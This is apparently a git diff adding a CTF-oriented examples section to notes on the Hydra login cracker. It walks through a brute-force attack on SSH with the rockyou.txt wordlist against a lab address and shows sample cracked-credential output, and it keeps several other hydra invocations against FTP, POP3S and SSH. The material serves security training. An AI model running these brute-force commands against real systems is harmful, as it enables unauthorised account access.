@@ -60,4 +60,24 @@ Examples:
   hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
   hydra -l admin -p password ftp://[192.168.0.0/24]/
   hydra -L logins.txt -P pws.txt -M targets.txt ssh
-  ```
+```
+
+## Examples
+
+The following examples are ones that I have used in capture the flag exercises. The wordlists that are provided are ones that are found on Kali unless otherwise specified.
+
+### ssh
+
+If a system is vulnerable to an ssh brute force (meaning if you type `ssh target_machine` and it asks for a password) and you have either a username or password, hydra can help you gain access.
+
+We have found the username `bob` is a user on the machine with an ip address of `10.10.1.1`. We want to use the `rockyou.txt` wordlist stored in the `/usr/share/wordlists` directory. The syntax is the following when not including options:
+
+`hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.1.1 ssh`
+
+or
+
+`hydra -l bob -P /usr/share/wordlists/rockyou.txt ssh:10.10.1.1`
+
+Hydra will then use go through each of the entries in the wordlist and report if any of the entries worked. The output will look like the following:
+
+`[22][ssh] host: 10.10.1.1    login: bob     password: 123456`
